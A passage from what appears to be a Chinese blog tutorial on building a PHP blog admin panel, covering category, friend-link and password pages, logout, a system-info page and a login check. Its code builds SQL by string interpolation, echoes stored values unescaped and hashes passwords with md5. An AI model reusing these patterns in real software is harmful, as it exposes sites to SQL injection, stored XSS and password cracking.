href="main.php"&gt;首页&lt;/a&gt;&lt;span class="crumb-step"&gt;&gt;&lt;/span&gt;&lt;a class="crumb-name" href=""&gt;栏目管理&lt;/a&gt;&lt;span class="crumb-step"&gt;&gt;&lt;/span&gt;&lt;span&gt;新增栏目&lt;/span&gt;&lt;/div&gt;    &lt;/div&gt;    &lt;div class="result-wrap"&gt;        &lt;div class="result-content"&gt;            &lt;form action="" method="post" id="myform" name="myform" enctype="multipart/form-data"&gt;                &lt;table class="insert-tab" width="100%"&gt;                    &lt;tbody&gt;                    &lt;tr&gt;                        &lt;th&gt;&lt;i class="require-red"&gt;*&lt;/i&gt;栏目：&lt;/th&gt;                        &lt;td&gt;                            &lt;input class="common-text required" id="title" name="title" size="50" value="" type="text"&gt;                        &lt;/td&gt;                    &lt;/tr&gt;                    &lt;tr&gt;                        &lt;th&gt;&lt;/th&gt;                        &lt;td&gt;                            &lt;input class="btn btn-primary btn6 mr10" value="提交" name="sub" type="submit"&gt;                            &lt;input class="btn btn6" onClick="history.go(-1)" value="返回" type="button"&gt;                        &lt;/td&gt;                    &lt;/tr&gt;                    &lt;/tbody&gt;&lt;/table&gt;            &lt;/form&gt;        &lt;/div&gt;    &lt;/div&gt;&lt;/div&gt;&lt;!--/main--&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>cate_edit.php</p><pre class="line-numbers language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">&lt;?phpinclude_once 'header.php';$id=filterstr($_GET['id']);$result = $conn-&gt;query("select * from cate where id='$id'");$row = $result-&gt;fetch_assoc();if($_POST['sub']){    $title = filterstr($_POST['title']);    $conn-&gt;query("update cate set class_name='$title' where id='$id'");    if($conn-&gt;affected_rows&gt;0){//affected_rows() 函数返回前一次 MySQL 操作所影响的记录行数。        redirect('2','cate_list.php','编辑分类成功');    }else{        redirect('2','cate_list.php','编辑分类失败');    }}?&gt;    &lt;!--/sidebar--&gt;    &lt;div class="main-wrap"&gt;        &lt;div class="crumb-wrap"&gt;            &lt;div class="crumb-list"&gt;&lt;i class="icon-font"&gt;&lt;/i&gt;&lt;a href="/jscss/admin/design/"&gt;首页&lt;/a&gt;&lt;span class="crumb-step"&gt;&gt;&lt;/span&gt;&lt;a class="crumb-name" href="/jscss/admin/design/"&gt;分类管理&lt;/a&gt;&lt;span class="crumb-step"&gt;&gt;&lt;/span&gt;&lt;span&gt;编辑分类&lt;/span&gt;&lt;/div&gt;        &lt;/div&gt;        &lt;div class="result-wrap"&gt;            &lt;div class="result-content"&gt;                &lt;form action="" method="post" id="myform" name="myform" enctype="multipart/form-data"&gt;                    &lt;table class="insert-tab" width="100%"&gt;                        &lt;tbody&gt;                        &lt;tr&gt;                            &lt;th&gt;&lt;i class="require-red"&gt;*&lt;/i&gt;栏目：&lt;/th&gt;                            &lt;td&gt;                                &lt;input class="common-text required" id="title" name="title" size="50" value="&lt;?php echo $row['class_name'];?&gt;" type="text"&gt;                            &lt;/td&gt;                        &lt;/tr&gt;                        &lt;tr&gt;                            &lt;th&gt;&lt;/th&gt;                            &lt;td&gt;                                &lt;input class="btn btn-primary btn6 mr10" value="提交"  name="sub" type="submit"&gt;                                &lt;input class="btn btn6" onClick="history.go(-1)" value="返回" type="button"&gt;                            &lt;/td&gt;                        &lt;/tr&gt;                        &lt;/tbody&gt;&lt;/table&gt;                &lt;/form&gt;            &lt;/div&gt;        &lt;/div&gt;    &lt;/div&gt;    &lt;!--/main--&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/07/13/60-zhi-day9/image-20210714191402650.png" alt="image-20210714191402650"></p><p><img src="/2021/07/13/60-zhi-day9/image-20210714191414651.png" alt="image-20210714191414651"></p><p><img src="/2021/07/13/60-zhi-day9/image-20210714191425498.png" alt="image-20210714191425498"></p><p><img src="/2021/07/13/60-zhi-day9/image-20210714191508589.png" alt="image-20210714191508589"></p><p><img src="/2021/07/13/60-zhi-day9/image-20210714191515331.png" alt="image-20210714191515331"></p><h2 id="友情链接模块编写"><a href="#友情链接模块编写" class="headerlink" title="友情链接模块编写"></a>友情链接模块编写</h2><p>友情连接与栏目模块也是大同小异，我们拿过来进行一些修改即可</p><p>也是会存在三部分flink_list flink_add flink_edit</p><p>flink_list.php</p><pre class="line-numbers language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">&lt;?phpinclude_once 'header.php';if($_GET['action']=='del'){    $id=filterstr($_GET['id']);    $conn-&gt;query("delete from flink where id='$id'");    if($conn-&gt;affected_rows&gt;0){        redirect('2','flink_list.php','删除成功');    }else{        redirect('2','flink_list.php','删除失败');    }}?&gt;    &lt;!--/sidebar--&gt;    &lt;div class="main-wrap"&gt;        &lt;div class="crumb-wrap"&gt;            &lt;div class="crumb-list"&gt;&lt;i class="icon-font"&gt;&lt;/i&gt;&lt;a href="index.html"&gt;首页&lt;/a&gt;&lt;span class="crumb-step"&gt;&gt;&lt;/span&gt;&lt;span class="crumb-name"&gt;分类管理&lt;/span&gt;&lt;/div&gt;        &lt;/div&gt;        &lt;div class="result-wrap"&gt;            &lt;form name="myform" id="myform" method="post"&gt;                &lt;div class="result-title"&gt;                    &lt;div class="result-list"&gt;                        &lt;a href="flink_add.php"&gt;&lt;i class="icon-font"&gt;&lt;/i&gt;新增友链&lt;/a&gt;                    &lt;/div&gt;                &lt;/div&gt;                &lt;div class="result-content"&gt;                    &lt;table class="result-tab" width="100%"&gt;                        &lt;tr&gt;                            &lt;th&gt;ID&lt;/th&gt;                            &lt;th&gt;网站名称&lt;/th&gt;                            &lt;th&gt;url&lt;/th&gt;                            &lt;th&gt;操作&lt;/th&gt;                        &lt;/tr&gt;                        &lt;tr&gt;                        &lt;?php                        $result = $conn-&gt;query("select * from flink");                        $result_count = $result-&gt;num_rows;                        while ($row=$result-&gt;fetch_assoc()){                        ?&gt;                            &lt;td&gt;&lt;?php echo $row['id']?&gt;&lt;/td&gt;                            &lt;td title="&lt;?php echo $row['url_name']?&gt;"&gt;&lt;a target="_blank"  href="flink_edit.php?id=&lt;?php echo $row['id'];?&gt;"title="&lt;?php echo $row['url_name']?&gt;"&gt;&lt;?php echo $row['url_name']?&gt;&lt;/a&gt;                            &lt;/td&gt;                            &lt;td title="&lt;?php echo $row['url']?&gt;"&gt;&lt;a target="_blank"  href="&lt;?php echo $row['url']?&gt;"title="&lt;?php echo $row['url']?&gt;"&gt;&lt;?php echo $row['url']?&gt;&lt;/a&gt;                            &lt;/td&gt;                            &lt;td&gt;                                &lt;a class="link-update" href="flink_edit.php?id=&lt;?php echo $row['id'];?&gt;"&gt;修改&lt;/a&gt;                                &lt;a class="link-del" href="javascript:del(&lt;?php echo $row['id'];?&gt;);"&gt;删除&lt;/a&gt;                            &lt;/td&gt;                        &lt;/tr&gt;                        &lt;?php                        }                        ?&gt;                    &lt;/table&gt;                &lt;/div&gt;            &lt;/form&gt;        &lt;/div&gt;    &lt;/div&gt;    &lt;!--/main--&gt;&lt;/div&gt;&lt;script&gt;    function del(id){        if(false==confirm("是否确定删除此友链？")) return;        location.href='?action=del&amp;id='+id;    }&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>flink_add.php</p><pre class="line-numbers language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">&lt;?phpinclude_once 'header.php';if($_POST['sub']){    $url_name = filterstr($_POST['url_name']);    $url = filterstr($_POST['url']);    $conn-&gt;query("insert into flink (url_name,url) value ('$url_name','$url')");    if($conn-&gt;affected_rows&gt;0){        redirect('2','flink_list.php','添加友链成功');    }else{        redirect('2','flink_list.php','添加友链失败');    }}?&gt;&lt;!--/sidebar--&gt;&lt;div class="main-wrap"&gt;    &lt;div class="crumb-wrap"&gt;        &lt;div class="crumb-list"&gt;&lt;i class="icon-font"&gt;&lt;/i&gt;&lt;a href="main.php"&gt;首页&lt;/a&gt;&lt;span class="crumb-step"&gt;&gt;&lt;/span&gt;&lt;a class="crumb-name" href=""&gt;友情链接&lt;/a&gt;&lt;span class="crumb-step"&gt;&gt;&lt;/span&gt;&lt;span&gt;新增友链&lt;/span&gt;&lt;/div&gt;    &lt;/div&gt;    &lt;div class="result-wrap"&gt;        &lt;div class="result-content"&gt;            &lt;form action="" method="post" id="myform" name="myform" &gt;                &lt;table class="insert-tab" width="100%"&gt;                    &lt;tbody&gt;                    &lt;tr&gt;                        &lt;th&gt;&lt;i class="require-red"&gt;*&lt;/i&gt;网站名称：&lt;/th&gt;                        &lt;td&gt;                            &lt;input class="common-text required" id="url_name" name="url_name" size="50"  type="text"&gt;                        &lt;/td&gt;                    &lt;/tr&gt;                    &lt;tr&gt;                        &lt;th&gt;&lt;i class="require-red"&gt;*&lt;/i&gt;网站url：&lt;/th&gt;                        &lt;td&gt;                            &lt;input class="common-text required" id="url" name="url" size="50"  type="text"&gt;                        &lt;/td&gt;                    &lt;/tr&gt;                    &lt;tr&gt;                        &lt;th&gt;&lt;/th&gt;                        &lt;td&gt;                            &lt;input class="btn btn-primary btn6 mr10" value="提交" name="sub" type="submit"&gt;                            &lt;input class="btn btn6" onClick="history.go(-1)" value="返回" type="button"&gt;                        &lt;/td&gt;                    &lt;/tr&gt;                    &lt;/tbody&gt;&lt;/table&gt;            &lt;/form&gt;        &lt;/div&gt;    &lt;/div&gt;&lt;/div&gt;&lt;!--/main--&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>flink_edit.php</p><pre class="line-numbers language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">&lt;?phpinclude_once 'header.php';$id=filterstr($_GET['id']);$result = $conn-&gt;query("select * from flink where id='$id'");$row = $result-&gt;fetch_assoc();if($_POST['sub']){    $url_name= filterstr($_POST['url_name']);    $url= filterstr($_POST['url']);    $conn-&gt;query("update flink set url_name='$url_name',url='$url' where id='$id'");    if($conn-&gt;affected_rows&gt;0){//affected_rows() 函数返回前一次 MySQL 操作所影响的记录行数。        redirect('2','flink_list.php','编辑友链成功');    }else{        redirect('2','flink_list.php','编辑友链失败');    }}?&gt;    &lt;!--/sidebar--&gt;    &lt;div class="main-wrap"&gt;        &lt;div class="crumb-wrap"&gt;            &lt;div class="crumb-list"&gt;&lt;i class="icon-font"&gt;&lt;/i&gt;&lt;a href="/jscss/admin/design/"&gt;首页&lt;/a&gt;&lt;span class="crumb-step"&gt;&gt;&lt;/span&gt;&lt;a class="crumb-name" href="/jscss/admin/design/"&gt;友情链接&lt;/a&gt;&lt;span class="crumb-step"&gt;&gt;&lt;/span&gt;&lt;span&gt;编辑友链&lt;/span&gt;&lt;/div&gt;        &lt;/div&gt;        &lt;div class="result-wrap"&gt;            &lt;div class="result-content"&gt;                &lt;form action="" method="post" id="myform" name="myform" enctype="multipart/form-data"&gt;                    &lt;table class="insert-tab" width="100%"&gt;                        &lt;tbody&gt;                        &lt;tr&gt;                            &lt;th&gt;&lt;i class="require-red"&gt;*&lt;/i&gt;网站名称：&lt;/th&gt;                            &lt;td&gt;                                &lt;input class="common-text required" id="title" name="url_name" size="50" value="&lt;?php echo $row['url_name'];?&gt;" type="text"&gt;                            &lt;/td&gt;                        &lt;/tr&gt;                        &lt;tr&gt;                            &lt;th&gt;&lt;i class="require-red"&gt;*&lt;/i&gt;友链：&lt;/th&gt;                            &lt;td&gt;                                &lt;input class="common-text required" id="title" name="url" size="50" value="&lt;?php echo $row['url'];?&gt;" type="text"&gt;                            &lt;/td&gt;                        &lt;/tr&gt;                        &lt;tr&gt;                            &lt;th&gt;&lt;/th&gt;                            &lt;td&gt;                                &lt;input class="btn btn-primary btn6 mr10" value="提交"  name="sub" type="submit"&gt;                                &lt;input class="btn btn6" onClick="history.go(-1)" value="返回" type="button"&gt;                            &lt;/td&gt;                        &lt;/tr&gt;                        &lt;/tbody&gt;&lt;/table&gt;                &lt;/form&gt;            &lt;/div&gt;        &lt;/div&gt;    &lt;/div&gt;    &lt;!--/main--&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/07/13/60-zhi-day9/image-20210714195828272.png" alt="image-20210714195828272"></p><p><img src="/2021/07/13/60-zhi-day9/image-20210714195834744.png" alt="image-20210714195834744"></p><p><img src="/2021/07/13/60-zhi-day9/image-20210714195844921.png" alt="image-20210714195844921"></p><p><img src="/2021/07/13/60-zhi-day9/image-20210714195854165.png" alt="image-20210714195854165"></p><p><img src="/2021/07/13/60-zhi-day9/image-20210714195901943.png" alt="image-20210714195901943"></p><p><img src="/2021/07/13/60-zhi-day9/image-20210714195907500.png" alt="image-20210714195907500"></p><h2 id="用户修改模块与模板细节处理"><a href="#用户修改模块与模板细节处理" class="headerlink" title="用户修改模块与模板细节处理"></a>用户修改模块与模板细节处理</h2><p>我们来做一下头部网站首页、修改密码等</p><p>头部修改密码类同修改edit大同小异 我们拿来修改下即可</p><p>users_edit.php</p><pre class="line-numbers language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">&lt;?phpinclude_once 'header.php';if($_POST['sub']){    $password = md5(filterstr($_POST['password']));    $conn-&gt;query("update users set password='$password' where username='$_SESSION[username]'");    if($conn-&gt;affected_rows&gt;0){        redirect('2','main.php','密码修改成功');    }else{        redirect('2','users_edit.php','密码修改失败');    }}?&gt;&lt;!--/sidebar--&gt;&lt;div class="main-wrap"&gt;    &lt;div class="crumb-wrap"&gt;        &lt;div class="crumb-list"&gt;&lt;i class="icon-font"&gt;&lt;/i&gt;&lt;a href="main.php"&gt;首页&lt;/a&gt;&lt;span class="crumb-step"&gt;&gt;&lt;/span&gt;&lt;a class="crumb-name" href="/jscss/admin/design/"&gt;作品管理&lt;/a&gt;&lt;span class="crumb-step"&gt;&gt;&lt;/span&gt;&lt;span&gt;编辑作品&lt;/span&gt;&lt;/div&gt;    &lt;/div&gt;    &lt;div class="result-wrap"&gt;        &lt;div class="result-content"&gt;            &lt;form action="" method="post" id="myform" name="myform" enctype="multipart/form-data"&gt;                &lt;table class="insert-tab" width="100%"&gt;                    &lt;tbody&gt;                    &lt;tr&gt;                        &lt;th&gt;&lt;i class="require-red"&gt;*&lt;/i&gt;密码：&lt;/th&gt;                        &lt;td&gt;                            &lt;input class="common-text required" id="password" name="password" size="50"  type="password"&gt;                        &lt;/td&gt;                    &lt;/tr&gt;                    &lt;th&gt;&lt;/th&gt;                    &lt;td&gt;                        &lt;input class="btn btn-primary btn6 mr10" value="提交" name="sub" type="submit"&gt;                        &lt;input class="btn btn6" onClick="history.go(-1)" value="返回" type="button"&gt;                    &lt;/td&gt;                    &lt;/tr&gt;                    &lt;/tbody&gt;&lt;/table&gt;            &lt;/form&gt;        &lt;/div&gt;    &lt;/div&gt;&lt;/div&gt;&lt;!--/main--&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/07/13/60-zhi-day9/image-20210714211247379.png" alt="image-20210714211247379"></p><p>此处修改密码不能与旧密码相同</p><p><img src="/2021/07/13/60-zhi-day9/image-20210714211258982.png" alt="image-20210714211258982"></p><p>修改完成后跳转到首页</p><p>还有就是修改文章 分类 友链 用户设置的一些细节 比如名字、首页跳转之类即可</p><h2 id="退出功能"><a href="#退出功能" class="headerlink" title="退出功能"></a>退出功能</h2><p>我们退出功能写在main.php里</p><p>部分main.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'action'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string single-quoted-string">'lagout'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">session_destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'2'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'login.php'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'退出成功，请重新登录'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>退出时跳转到main的logout的action即可</p><p>部分header.php</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>top-info-wrap<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>top-info-list clearfix<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token prolog">&lt;?php echo $_SESSION['username']?&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>users_edit.php<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>修改密码<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>main.php?action=lagout<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>退出<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="后台主页系统信息的实现"><a href="#后台主页系统信息的实现" class="headerlink" title="后台主页系统信息的实现"></a>后台主页系统信息的实现</h2><p>main.php</p><pre class="line-numbers language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">&lt;?phpinclude_once 'header.php';/*if($_SESSION['username']){    echo $_SESSION['username'];}else{    echo "验证失败";}*/if($_GET['action']=='lagout'){    session_destroy();    redirect('2','login.php','退出成功，请重新登录');}?&gt;    &lt;!--/sidebar--&gt;    &lt;div class="main-wrap"&gt;        &lt;div class="crumb-wrap"&gt;            &lt;div class="crumb-list"&gt;&lt;i class="icon-font"&gt;&amp;#xe06b;&lt;/i&gt;&lt;span&gt;欢迎使用『晓莎K』博客程序。&lt;/span&gt;&lt;/div&gt;        &lt;/div&gt;        &lt;div class="result-wrap"&gt;            &lt;div class="result-title"&gt;                &lt;h1&gt;快捷操作&lt;/h1&gt;            &lt;/div&gt;            &lt;div class="result-content"&gt;                &lt;div class="short-wrap"&gt;                    &lt;a href="article_add.php"&gt;&lt;i class="icon-font"&gt;&amp;#xe001;&lt;/i&gt;新增博文&lt;/a&gt;                    &lt;a href="flink_list.php"&gt;&lt;i class="icon-font"&gt;&amp;#xe048;&lt;/i&gt;友情链接&lt;/a&gt;                    &lt;a href="cate_add.php"&gt;&lt;i class="icon-font"&gt;&amp;#xe041;&lt;/i&gt;新增分类&lt;/a&gt;                &lt;/div&gt;            &lt;/div&gt;        &lt;/div&gt;        &lt;div class="result-wrap"&gt;            &lt;div class="result-title"&gt;                &lt;h1&gt;系统基本信息&lt;/h1&gt;            &lt;/div&gt;            &lt;div class="result-content"&gt;                &lt;ul class="sys-info-list"&gt;                    &lt;li&gt;                        &lt;label class="res-lab"&gt;操作系统&lt;/label&gt;&lt;span class="res-info"&gt;&lt;?php echo php_uname('s');?&gt;&lt;/span&gt;                    &lt;/li&gt;                    &lt;li&gt;                        &lt;label class="res-lab"&gt;运行环境&lt;/label&gt;&lt;span class="res-info"&gt;&lt;?php echo $_SERVER['SERVER_SOFTWARE']?&gt;&gt;&lt;/span&gt;                    &lt;/li&gt;                    &lt;li&gt;                        &lt;label class="res-lab"&gt;PHP运行方式&lt;/label&gt;&lt;span class="res-info"&gt;&lt;?php echo php_sapi_name();?&gt;/span&gt;                    &lt;/li&gt;                    &lt;li&gt;                        &lt;label class="res-lab"&gt;晓莎K-版本&lt;/label&gt;&lt;span class="res-info"&gt;K-0.1&lt;/span&gt;                    &lt;/li&gt;                    &lt;li&gt;                        &lt;label class="res-lab"&gt;上传附件限制&lt;/label&gt;&lt;span class="res-info"&gt;&lt;?php echo ini_get('upload_max_filesize');?&gt;&lt;/span&gt;                    &lt;/li&gt;                    &lt;li&gt;                        &lt;label class="res-lab"&gt;北京时间&lt;/label&gt;&lt;span class="res-info"&gt;&lt;?php echo date("Y-m-d H:i:s",time());?&gt;&lt;/span&gt;                    &lt;/li&gt;                    &lt;li&gt;                        &lt;label class="res-lab"&gt;服务器域名/IP&lt;/label&gt;&lt;span class="res-info"&gt;&lt;?php echo $_SERVER['HTTP_HOST'];?&gt; [&lt;?php echo $_SERVER['SERVER_ADDR'];?&gt;]&lt;/span&gt;                    &lt;/li&gt;                    &lt;li&gt;                        &lt;label class="res-lab"&gt;Host&lt;/label&gt;&lt;span class="res-info"&gt;&lt;?php echo $_SERVER['SERVER_ADDR'];?&gt;&lt;/span&gt;                    &lt;/li&gt;                &lt;/ul&gt;            &lt;/div&gt;        &lt;/div&gt;    &lt;/div&gt;    &lt;!--/main--&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/07/13/60-zhi-day9/image-20210715112404456.png" alt="image-20210715112404456"></p><h2 id="权限限制"><a href="#权限限制" class="headerlink" title="权限限制"></a>权限限制</h2><p>到此我们进行退出销毁session后，我们输入一个网站比如<a href="http://www.phpcblog.com/admin/main.php%EF%BC%8C%E8%BF%98%E6%98%AF%E4%BC%9A%E8%BF%9B%E5%85%A5%E4%B8%BB%E9%A1%B5%E9%9D%A2">http://www.phpcblog.com/admin/main.php，还是会进入主页面</a></p><p><img src="/2021/07/13/60-zhi-day9/image-20210715112619452.png" alt="image-20210715112619452"></p><p>看出来没有登录直接进来，所以我们需要进行一个权限检查</p><p>我们做个check.php，在里面检查session里面username是否存在，如果不存在我们就跳转到登录界面，并且为了不让页面内容显示出来，我们使用exit</p><p>每个页面都需要权限限制，所以我们在header里面引入它</p><p>check.php</p><pre class="line-numbers language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">&lt;?phpinclude_once 'init.php';if(!$_SESSION['username']){    redirect('0','login.php');    exit;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这样我们直接访问main article cate flink就会进行权限检查，如果没有登录直接访问就会跳转到登录界面</p><h2 id="博客系统首页头部功能实现"><a href="#博客系统首页头部功能实现" class="headerlink" title="博客系统首页头部功能实现"></a>博客系统首页头部功能实现</h2><p>到此我们已经把网站的后台做的差不多，我们开始做网站的首页，也就是index.php，我们把套用的模板放到项目里</p><p><img src="/2021/07/13/60-zhi-day9/image-20210715122104133.png" alt="image-20210715122104133"></p><p><img src="/2021/07/13/60-zhi-day9/image-20210715122114133.png" alt="image-20210715122114133"></p><p>将index.html的东西放到index.php中，然后我们把网站的信息通过数据库查询的方式输出出来，并且把公共部分放到header里，同后台那样引入过来</p><p>header.php</p><pre class="line-numbers language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">&lt;?php?&gt;&lt;!DOCTYPE HTML&gt;&lt;html&gt;&lt;head&gt;    &lt;meta charset="utf-8"&gt;    &lt;meta http-equiv="X-UA-Compatible" content="IE=edge"&gt;    &lt;title&gt;&lt;?php echo $web['website_title']; ?&gt;&lt;/title&gt;    &lt;meta name="viewport" content="width=device-width, initial-scale=1"&gt;    &lt;meta name="description" content="&lt;?php echo $web['website_desc']; ?&gt;" /&gt;    &lt;meta name="keywords" content="&lt;?php echo $web['website_keywords']; ?&gt;" /&gt;    &lt;meta name="author" content="晓莎K" /&gt;    &lt;link rel="shortcut icon" type="image/x-icon" href="favicon.ico" /&gt;    &lt;link rel="stylesheet" type="text/css" href="css/bootstrap.min.css" /&gt;    &lt;link rel="stylesheet" type="text/css" href="css/materialdesignicons.min.css" /&gt;    &lt;link rel="stylesheet" type="text/css" href="css/style.min.css" /&gt;&lt;/head&gt;&lt;body&gt;&lt;header class="lyear-header text-center" style="background-image:url(images/left-bg.jpg);"&gt;    &lt;div class="lyear-header-container"&gt;        &lt;div class="lyear-mask"&gt;&lt;/div&gt;        &lt;h1 class="lyear-blogger pt-lg-4 mb-0"&gt;&lt;a href="index.php"&gt;&lt;?php echo $web['website_title']; ?&gt;&lt;/a&gt;&lt;/h1&gt;        &lt;nav class="navbar navbar-expand-lg"&gt;            &lt;a class="navbar-toggler" data-toggle="collapse" data-target="#navigation" aria-controls="navigation" 